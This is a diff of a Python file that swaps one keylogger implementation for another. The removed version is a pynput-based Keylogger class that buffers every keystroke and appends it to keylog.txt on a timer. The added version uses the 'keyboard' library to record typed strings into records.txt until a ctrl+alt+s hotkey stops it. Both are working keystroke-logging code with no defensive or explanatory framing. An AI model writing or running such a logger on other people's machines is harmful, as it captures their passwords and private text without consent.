@@ -1,51 +1,25 @@
-from pynput import keyboard
-import threading
-import time
+import keyboard as kb
+from threading import Thread
 
-class Keylogger:
-    def __init__(self, interval=10):
-        self.log = ""  
-        self.filepath = "keylog.txt"  # File to save the keystrokes
-        self.interval = interval 
-        self.lock = threading.Lock()
+SHOULD_RECORD = True
 
-    def on_press(self, key):
-  
-        with self.lock:
-            try:
-                self.log += key.char
-            except AttributeError:
-                # Handle special keys
-                if key == keyboard.Key.space:
-                    self.log += ' '
-                elif key == keyboard.Key.enter:
-                    self.log += '\n'
-                else:
-                    self.log += f' [{key}] '
+def start_rec():
+    while SHOULD_RECORD:
+        rec = kb.record(until="escape")
+        seq = kb.get_typed_strings(rec)
+        with open("records.txt", "a") as f:
+            f.write("".join(seq) + "\n")
+        print("One chunk saved")
 
-    def save_log(self):
- 
-        with self.lock:
-            with open(self.filepath, 'a') as file:
-                file.write(self.log)
-                self.log = "" 
-    def report(self):
-    
-        while True:
-            time.sleep(self.interval)
-            self.save_log()
+def stop_rec():
+    global SHOULD_RECORD
+    SHOULD_RECORD = False
 
-    def start(self):
-     
-        listener = keyboard.Listener(on_press=self.on_press)
-        listener.start()
 
-        report_thread = threading.Thread(target=self.report)
-        report_thread.start()
+start_thread = Thread(target=start_rec)
+start_thread.start()
 
-        listener.join()  
 
-if __name__ == "__main__":
-    keylogger = Keylogger(interval=10)
-    keylogger.start()
-   
+kb.add_hotkey("ctrl+alt+s", stop_rec)
+
+kb.wait()
